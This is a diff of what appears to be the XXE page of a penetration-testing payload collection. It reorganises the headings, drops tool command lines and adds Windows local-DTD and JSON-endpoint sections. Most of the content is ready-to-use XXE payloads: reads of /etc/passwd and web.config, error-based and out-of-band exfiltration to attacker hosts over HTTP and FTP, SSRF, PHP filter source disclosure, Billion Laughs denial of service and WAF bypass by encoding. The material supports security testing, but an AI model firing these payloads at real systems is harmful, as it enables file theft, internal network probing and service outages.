@@ -6,93 +6,50 @@
 ## Summary
 
 - [Tools](#tools)
-- [Detect the vulnerability](#detect-the-vulnerability)
-- [Exploiting XXE to retrieve files](#exploiting-xxe-to-retrieve-files)
+- [Detect The Vulnerability](#detect-the-vulnerability)
+- [Exploiting XXE to Retrieve Files](#exploiting-xxe-to-retrieve-files)
     - [Classic XXE](#classic-xxe)
-    - [Classic XXE Base64 encoded](#classic-xxe-base64-encoded)
-    - [PHP Wrapper inside XXE](#php-wrapper-inside-xxe)
-    - [XInclude attacks](#xinclude-attacks)
-- [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-SSRF-attacks)
-- [Exploiting XXE to perform a denial of service](#exploiting-xxe-to-perform-a-denial-of-service)
+    - [Classic XXE Base64 Encoded](#classic-xxe-base64-encoded)
+    - [PHP Wrapper Inside XXE](#php-wrapper-inside-xxe)
+    - [XInclude Attacks](#xinclude-attacks)
+- [Exploiting XXE to Perform SSRF Attacks](#exploiting-xxe-to-perform-SSRF-attacks)
+- [Exploiting XXE to Perform a Denial of Service](#exploiting-xxe-to-perform-a-denial-of-service)
     - [Billion Laugh Attack](#billion-laugh-attack)
-    - [YAML attack](#yaml-attack)
-    - [Parameters Laugh attack](#parameters-laugh-attack)
+    - [YAML Attack](#yaml-attack)
+    - [Parameters Laugh Attack](#parameters-laugh-attack)
 - [Exploiting Error Based XXE](#exploiting-error-based-xxe)
     - [Error Based - Using Local DTD File](#error-based---using-local-dtd-file)
+        - [Linux Local DTD](#linux-local-dtd)
+        - [Windows Local DTD](#windows-local-dtd)
     - [Error Based - Using Remote DTD](#error-based---using-remote-dtd)
-- [Exploiting blind XXE to exfiltrate data out-of-band](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
+- [Exploiting Blind XXE to Exfiltrate Data Out Of Band](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
     - [Blind XXE](#blind-xxe)
     - [XXE OOB Attack (Yunusov, 2013)](#xxe-oob-attack-yusonov---2013)
-    - [XXE OOB with DTD and PHP filter](#xxe-oob-with-dtd-and-php-filter)
+    - [XXE OOB with DTD and PHP Filter](#xxe-oob-with-dtd-and-php-filter)
     - [XXE OOB with Apache Karaf](#xxe-oob-with-apache-karaf)
 - [WAF Bypasses](#waf-bypasses)
-   - [Bypass via character encoding](#bypass-via-character-encoding)
-- [XXE in Java](#xxe-in-java)
-- [XXE in exotic files](#xxe-in-exotic-files)
-    - [XXE inside SVG](#xxe-inside-svg)
-    - [XXE inside SOAP](#xxe-inside-soap)
-    - [XXE inside DOCX file](#xxe-inside-docx-file)
-    - [XXE inside XLSX file](#xxe-inside-xlsx-file)
-    - [XXE inside DTD file](#xxe-inside-dtd-file)
-- [Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents](#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents)
+   - [Bypass via Character Encoding](#bypass-via-character-encoding)
+   - [XXE on JSON Endpoints](#xxe-on-json-endpoints)
+- [XXE in Exotic Files](#xxe-in-exotic-files)
+    - [XXE Inside SVG](#xxe-inside-svg)
+    - [XXE Inside SOAP](#xxe-inside-soap)
+    - [XXE Inside DOCX file](#xxe-inside-docx-file)
+    - [XXE Inside XLSX file](#xxe-inside-xlsx-file)
+    - [XXE Inside DTD file](#xxe-inside-dtd-file)
 - [Labs](#labs)
 - [References](#references)
 
 
 ## Tools
 
-- [xxeftp](https://github.com/staaldraad/xxeserv) - A mini webserver with FTP support for XXE payloads
-  ```ps1
-  sudo ./xxeftp -uno 443
-  ./xxeftp -w -wps 5555
-  ```
-- [230-OOB](https://github.com/lc/230-OOB) - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via [http://xxe.sh/](http://xxe.sh/)
-  ```ps1
-  $ python3 230.py 2121
-  ```
-- [XXEinjector](https://github.com/enjoiz/XXEinjector) - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods
-  ```ps1
-  # Enumerating /etc directory in HTTPS application:
-  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
-  # Enumerating /etc directory using gopher for OOB method:
-  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
-  # Second order exploitation:
-  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt
-  # Bruteforcing files using HTTP out of band method and netdoc protocol:
-  ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
-  # Enumerating using direct exploitation:
-  ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK
-  # Enumerating unfiltered ports:
-  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all
-  # Stealing Windows hashes:
-  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes
-  # Uploading files using Java jar:
-  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf
-  # Executing system commands using PHP expect:
-  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls
-  # Testing for XSLT injection:
-  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt
-  # Log requests only:
-  ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt
-  ```
-- [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)
-  ```ps1
-  ruby server.rb
-  ```
-- [docem](https://github.com/whitel1st/docem) - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc
-  ```ps1
-  ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx
-  ./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place
-  ./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place
-  ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx
-  ```
-- [otori](http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html) - Toolbox intended to allow useful exploitation of XXE vulnerabilities.
-  ```ps1
-  python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs
-  ```
+- [staaldraad/xxeftp](https://github.com/staaldraad/xxeserv) - A mini webserver with FTP support for XXE payloads
+- [lc/230-OOB](https://github.com/lc/230-OOB) - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via [http://xxe.sh/](http://xxe.sh/)
+- [enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector) - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods
+- [BuffaloWill/oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)
+- [whitel1st/docem](https://github.com/whitel1st/docem) - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc
 
 
-## Detect the vulnerability
+## Detect The Vulnerability
 
 **Internal Entity**: If an entity is declared within a DTD it is called an internal entity.
 Syntax: `<!ENTITY entity_name "entity_value">`
@@ -113,7 +70,7 @@ Basic entity test, when the XML parser parses the external entities the result s
 
 It might help to set the `Content-Type: application/xml` in the request when sending XML payload to the server.
 
-## Exploiting XXE to retrieve files
+## Exploiting XXE to Retrieve Files
 
 ### Classic XXE
 
@@ -153,13 +110,13 @@ We try to display the content of the file `/etc/passwd`.
 <!ENTITY xxe PUBLIC "Any TEXT" "URL">
 ```
 
-### Classic XXE Base64 encoded
+### Classic XXE Base64 Encoded
 
 ```xml
 <!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
 ```
 
-### PHP Wrapper inside XXE
+### PHP Wrapper Inside XXE
 
 ```xml
 <!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
@@ -183,7 +140,7 @@ We try to display the content of the file `/etc/passwd`.
 <foo>&xxe;</foo>
 ```
 
-### XInclude attacks
+### XInclude Attacks
 
 When you can't modify the **DOCTYPE** element use the **XInclude** to target
 
@@ -194,7 +151,7 @@ When you can't modify the **DOCTYPE** element use the **XInclude** to target
 
 
 
-## Exploiting XXE to perform SSRF attacks
+## Exploiting XXE to Perform SSRF Attacks
 
 XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) to target another service on the network.
 
@@ -208,7 +165,7 @@ XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo
 ```
 
 
-## Exploiting XXE to perform a denial of service
+## Exploiting XXE to Perform a Denial of Service
 
 :warning: : These attacks might kill the service or the server, do not use them on the production.
 
@@ -225,7 +182,7 @@ XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo
 <data>&a4;</data>
 ```
 
-### YAML attack
+### YAML Attack
 
 ```xml
 a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
@@ -239,7 +196,7 @@ h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
 i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 ```
 
-### Parameters Laugh attack
+### Parameters Laugh Attack
 
 A variant of the Billion Laughs attack, using delayed interpretation of parameter entities, by Sebastian Pipping.
 
@@ -259,7 +216,22 @@ A variant of the Billion Laughs attack, using delayed interpretation of paramete
 
 ### Error Based - Using Local DTD File
 
-Short list of dtd files already stored on Linux systems; list them with `locate .dtd`:
+If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.
+
+```xml
+<!DOCTYPE root [
+    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
+    %local_dtd;
+]>
+<root></root>
+```
+
+* [GoSecure/dtd-finder](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md) - List DTDs and generate XXE payloads using those local DTDs.
+
+
+#### Linux Local DTD
+
+Short list of DTD files already stored on Linux systems; list them with `locate .dtd`:
 
 ```xml
 /usr/share/xml/fontconfig/fonts.dtd
@@ -286,6 +258,42 @@ The final payload becomes:
 ]>
 <message>Text</message>
 ```
+
+#### Windows Local DTD
+
+Payloads from [infosec-au/xxe-windows.md](https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79).
+
+* Disclose local file
+
+  ```xml
+  <!DOCTYPE doc [
+      <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+      <!ENTITY % SuperClass '>
+          <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
+          <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
+          &#x25;eval;
+          &#x25;error;
+        <!ENTITY test "test"'
+      >
+      %local_dtd;
+    ]><xxx>anything</xxx>
+  ```
+
+* Disclose HTTP Response
+
+  ```xml
+  <!DOCTYPE doc [
+      <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+      <!ENTITY % SuperClass '>
+          <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
+          <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
+          &#x25;eval;
+          &#x25;error;
+        <!ENTITY test "test"'
+      >
+      %local_dtd;
+    ]><xxx>anything</xxx>
+  ```
 
 
 ### Error Based - Using Remote DTD
@@ -334,7 +342,7 @@ Let's break down the payload:
 
 
 
-## Exploiting blind XXE to exfiltrate data out-of-band
+## Exploiting Blind XXE to Exfiltrate Data Out of Band
 
 Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.
 
@@ -349,6 +357,12 @@ The easiest way to test for a blind XXE is to try to load a remote resource such
 ]>
 <r></r>
 ```
+
+```xml
+<!DOCTYPE root [<!ENTITY test SYSTEM 'http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net'>]>
+<root>&test;</root>
+```
+
 
 Send the content of `/etc/passwd` to "www.malicious.com", you may receive only the first line.
 
@@ -376,7 +390,7 @@ File stored on http://publicServer.com/parameterEntity_oob.dtd
 %all;
 ```
 
-### XXE OOB with DTD and PHP filter
+### XXE OOB with DTD and PHP Filter
 
 ```xml
 <?xml version="1.0" ?>
@@ -415,62 +429,12 @@ Send the XML file to the `deploy` folder.
 Ref. [brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)
 
 
-## XXE with local DTD
-
-In some case, outgoing connections are not possible from the web application. DNS names might even not resolve externally with a payload like this:
-```xml
-<!DOCTYPE root [<!ENTITY test SYSTEM 'http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net'>]>
-<root>&test;</root>
-```
-
-If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.
-
-```xml
-<!DOCTYPE root [
-    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
-
-    %local_dtd;
-]>
-<root></root>
-```
-
-Assuming payloads such as the previous return a verbose error. You can start pointing to local DTD. With an found DTD, you can submit payload such as the following payload. The content of the file will be place in the error message.
-
-```xml
-<!DOCTYPE root [
-    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
-
-    <!ENTITY % ISOamsa '
-        <!ENTITY &#x25; file SYSTEM "file:///REPLACE_WITH_FILENAME_TO_READ">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-        '>
-
-    %local_dtd;
-]>
-<root></root>
-```
-### Cisco WebEx
-```
-<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd">
-<!ENTITY % url.attribute.set '>Your DTD code<!ENTITY test "test"'>
-%local_dtd;
-```
-### Citrix XenMobile Server
-```
-<!ENTITY % local_dtd SYSTEM "jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
-<!ENTITY % Body '>Your DTD code<!ENTITY test "test"'>
-%local_dtd;
-```
-[Other payloads using different DTDs](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md)
-
-
 ## WAF Bypasses
 
-### Bypass via character encoding
+### Bypass via Character Encoding
 
 XML parsers uses 4 methods to detect encoding:
+
 * HTTP Content Type: `Content-Type: text/xml; charset=utf-8`
 * Reading Byte Order Mark (BOM)
 * Reading first symbols of document 
@@ -491,30 +455,34 @@ XML parsers uses 4 methods to detect encoding:
 cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
 ```
 
-## XXE in Java
 
-Insecure configuration in 10 different Java classes from three XML processing interfaces (DOM, SAX, StAX) that can lead to XXE:
+### XXE on JSON Endpoints
 
-![XXE Java security features overview infographics](https://semgrep.dev/docs/assets/images/cheat-sheets-xxe-java-infographics-1d1d5016802e3ab8f0886b62b8c81f21.png)
+In the HTTP request try to switch the `Content-Type` from **JSON** to **XML**, 
 
-- [DocumentBuilderFactory (javax.xml.parsers.DocumentBuilderFactory)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3a-documentbuilderfactory)
-- [SAXBuilder (org.jdom2.input.SAXBuilder)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3b-saxbuilder)
-- [SAXParserFactory (javax.xml.parsers.SAXParserFactory)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3c-saxparserfactory)
-- [SAXParser (javax.xml.parsers.SAXParser )](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3d-saxparser)
-- [SAXReader (org.dom4j.io.SAXReader)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3e-saxreader)
-- [TransformerFactory (javax.xml.transform.TransformerFactory) & SAXTransformerFactory (javax.xml.transform.sax.SAXTransformerFactory)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3f-transformerfactory--saxtransformerfactory)
-- [SchemaFactory (javax.xml.validation.SchemaFactory)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3g-schemafactory)
-- [Validator (javax.xml.validation.Validator)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3h-validator)
-- [XMLReader (org.xml.sax.XMLReader)](https://semgrep.dev/docs/cheat-sheets/java-xxe/#3i-xmlreader)
+| Content Type       | Data                               |
+| ------------------ | ---------------------------------- |
+| `application/json` | `{"search":"name","value":"test"}` |
+| `application/xml`  | `<?xml version="1.0" encoding="UTF-8" ?><root><search>name</search><value>data</value></root>` |
 
-Ref.
 
-- [Semgrep - XML Security in Java](https://semgrep.dev/blog/2022/xml-security-in-java)
-- [Semgrep - XML External entity prevention for Java](https://semgrep.dev/docs/cheat-sheets/java-xxe/)
+* XML documents must contain one root (`<root>`) element that is the parent of all other elements.
+* The data must be converted to XML too, otherwise the server will respond with an error. 
 
-## XXE in exotic files
+```json
+{
+  "errors":{
+    "errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."
+  }
+}
+```
 
-### XXE inside SVG
+* [NetSPI/Content-Type Converter](https://github.com/NetSPI/Burp-Extensions/releases/tag/1.4)
+
+
+## XXE in Exotic Files
+
+### XXE Inside SVG
 
 ```xml
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
@@ -565,7 +533,7 @@ _xxe.svg_
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
 ```
 
-### XXE inside SOAP
+### XXE Inside SOAP
 
 ```xml
 <soap:Body>
@@ -575,7 +543,7 @@ _xxe.svg_
 </soap:Body>
 ```
 
-### XXE inside DOCX file
+### XXE Inside DOCX file
 
 Format of an Open XML file (inject the payload in any .xml file):
 
@@ -600,11 +568,11 @@ JPG (experimental)
 GIF (experimental)
 ```
 
-### XXE inside XLSX file
+### XXE Inside XLSX file
 
 Structure of the XLSX:
 
-```
+```ps1
 $ 7z l xxe.xlsx
 [...]
    Date      Time    Attr         Size   Compressed  Name
@@ -661,13 +629,13 @@ And using FTP instead of HTTP allows to retrieve much larger files.
 <!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
 ```
 
-Serve DTD and receive FTP payload using [xxeserv](https://github.com/staaldraad/xxeserv):
+Serve DTD and receive FTP payload using [staaldraad/xxeserv](https://github.com/staaldraad/xxeserv):
 
-```
+```ps1
 $ xxeserv -o files.log -p 2121 -w -wd public -wp 8000
 ```
 
-### XXE inside DTD file
+### XXE Inside DTD file
 
 Most XXE payloads detailed above require control over both the DTD or `DOCTYPE` block as well as the `xml` file.
 In rare situations, you may only control the DTD file and won't be able to modify the `xml` file. For example, a MITM.
@@ -682,42 +650,6 @@ When all you control is the DTD file, and you do not control the `xml` file, XXE
 %external;
 ```
 
-
-## Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents
-
-From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79
-
-### Disclose local file
-
-```xml
-<!DOCTYPE doc [
-    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
-    <!ENTITY % SuperClass '>
-        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-      <!ENTITY test "test"'
-    >
-    %local_dtd;
-  ]><xxx>cacat</xxx>
-```
-
-### Disclose HTTP Response:
-
-```xml
-<!DOCTYPE doc [
-    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
-    <!ENTITY % SuperClass '>
-        <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
-        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
-        &#x25;eval;
-        &#x25;error;
-      <!ENTITY test "test"'
-    >
-    %local_dtd;
-  ]><xxx>cacat</xxx>
-```
 
 ## Labs
 
@@ -752,6 +684,7 @@ From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79
 - [OOB XXE through SAML - Sean Melia (@seanmeals) - January 2016](https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf)
 - [Payloads for Cisco and Citrix - Arseniy Sharoglazov - January 1, 2016](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
 - [Pentest XXE - @phonexicum - March 9, 2020](https://phonexicum.github.io/infosec/xxe.html)
+- [Playing with Content-Type – XXE on JSON Endpoints - Antti Rantasaari - April 20, 2015](https://www.netspi.com/blog/technical-blog/web-application-pentesting/playing-content-type-xxe-json-endpoints/)
 - [REDTEAM TALES 0X1: SOAPY XXE - Uncover and exploit XXE vulnerability in SOAP WS - Optistream - May 27, 2024](https://www.optistream.io/blogs/tech/redteam-stories-1-soapy-xxe)
 - [XML attacks - Mariusz Banach (@mgeeky) - December 21, 2017](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
 - [XML external entity (XXE) injection - PortSwigger - May 29, 2019](https://portswigger.net/web-security/xxe)
